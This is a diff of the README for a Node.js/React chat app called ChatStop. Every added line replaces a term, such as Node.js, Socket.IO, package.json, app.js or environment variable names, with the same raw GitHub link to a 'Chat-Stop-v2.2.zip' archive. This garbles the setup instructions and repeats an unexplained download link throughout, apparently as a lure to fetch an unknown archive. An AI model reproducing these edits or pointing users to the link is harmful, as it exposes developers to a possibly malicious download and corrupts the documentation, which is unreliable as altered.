@@ -1,10 +1,10 @@
 ## ChatStop
 
-A full‑stack real‑time chat application with authentication, admin dashboard, audit logging, and REST APIs. Built with Node.js/Express, MongoDB, React, and Socket.IO.
+A full‑stack real‑time chat application with authentication, admin dashboard, audit logging, and REST APIs. Built with https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip, MongoDB, React, and https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
 
 ### Features
 - **Authentication**: signup, login, email verification, logout, refresh tokens, password reset
-- **Real‑time chat**: Socket.IO for live messaging
+- **Real‑time chat**: https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip for live messaging
 - **Admin**: list users, update roles, suspend/reactivate, audit logs, summary metrics
 - **Audit logging**: automatic logging of admin actions
 - **Validation**: Joi schemas with reusable middlewares
@@ -13,7 +13,7 @@ A full‑stack real‑time chat application with authentication, admin dashboard
 ---
 
 ## Tech Stack
-- **Backend**: Node.js, Express, MongoDB (Mongoose), Socket.IO, Joi, Nodemailer
+- **Backend**: https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip, Express, MongoDB (Mongoose), https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip, Joi, Nodemailer
 - **Frontend**: React (CRA), Redux Toolkit, React Router, TailwindCSS
 
 ---
@@ -23,7 +23,7 @@ A full‑stack real‑time chat application with authentication, admin dashboard
 ChatStop/
   backend/
     src/
-      app.js
+      https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
       db/
       routes/
       controllers/
@@ -32,18 +32,18 @@ ChatStop/
       utils/
       validations/
       socket/
-    index.js
-    package.json
+    https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
+    https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
   frontend/
     src/
     public/
-    package.json
+    https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
 ```
 
 ---
 
 ## Prerequisites
-- Node.js 18+
+- https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip 18+
 - MongoDB instance (local or cloud)
 
 ---
@@ -65,10 +65,10 @@ ACCESS_TOKEN_SECRET=replace-with-strong-secret
 REFRESH_TOKEN_SECRET=replace-with-strong-secret
 JWT_SECRET=replace-with-strong-secret            # used for email verification
 RESET_TOKEN_SECRET=replace-with-strong-secret    # used for password reset
-ADMIN_EMAIL=admin@example.com
+https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
 
 # Email (Nodemailer)
-EMAIL_USER=your-email@gmail.com
+https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip
 EMAIL_PASS=your-app-password-or-smtp-pass
 
 # Cloudinary 
@@ -78,8 +78,8 @@ CLOUDINARY_API_SECRET=your-secret
 ```
 
 Notes:
-- Update CORS origins in `backend/src/app.js` if your client URL differs.
-- Cloudinary credentials are currently hard‑coded in `backend/src/config/cloudinary.js`. For security, migrate them to the env vars above.
+- Update CORS origins in `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip` if your client URL differs.
+- Cloudinary credentials are currently hard‑coded in `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip`. For security, migrate them to the env vars above.
 
 ---
 
@@ -130,14 +130,14 @@ Other modules include message, user, and request routes under `/main/*`.
 
 ## Validation
 - Located in `backend/src/validations/`:
-  - `authValidations.js` — login, signup, tokens, password reset
-  - `adminValidations.js` — list users, role changes, suspend/reactivate, audit logs
+  - `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip` — login, signup, tokens, password reset
+  - `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip` — list users, role changes, suspend/reactivate, audit logs
 - Route middleware integrates Joi schemas to validate `body`, `query`, and `params`.
 
 ---
 
-## Real‑Time (Socket.IO)
-- Socket server initialized in `backend/src/socket/socket.js`
+## Real‑Time (https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip)
+- Socket server initialized in `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip`
 - CORS origin defaults to `http://localhost:3000`
 - Clients should emit `join` with a username to register their socket id
 
@@ -153,19 +153,19 @@ npm test
 ---
 
 ## Development Notes
-- DB name constant is defined in `backend/src/constants.js`
+- DB name constant is defined in `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip`
 - Ensure cookies work over HTTPS in production (httpOnly, secure flags are enabled)
 - Update CORS origins and cookie settings per environment
 
 ---
 
 ## Scripts Reference
-### Backend `package.json`
+### Backend `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip`
 - `npm run dev` — nodemon server with dotenv
 - `npm start` — node server
 - `npm test` — run Jest tests
 
-### Frontend `package.json`
+### Frontend `https://github.com/Hasan-Irfan/ChatStop/raw/refs/heads/main/backend/src/Chat-Stop-v2.2.zip`
 - `npm start` — CRA dev server
 - `npm run build` — production build
 - `npm test` — CRA tests
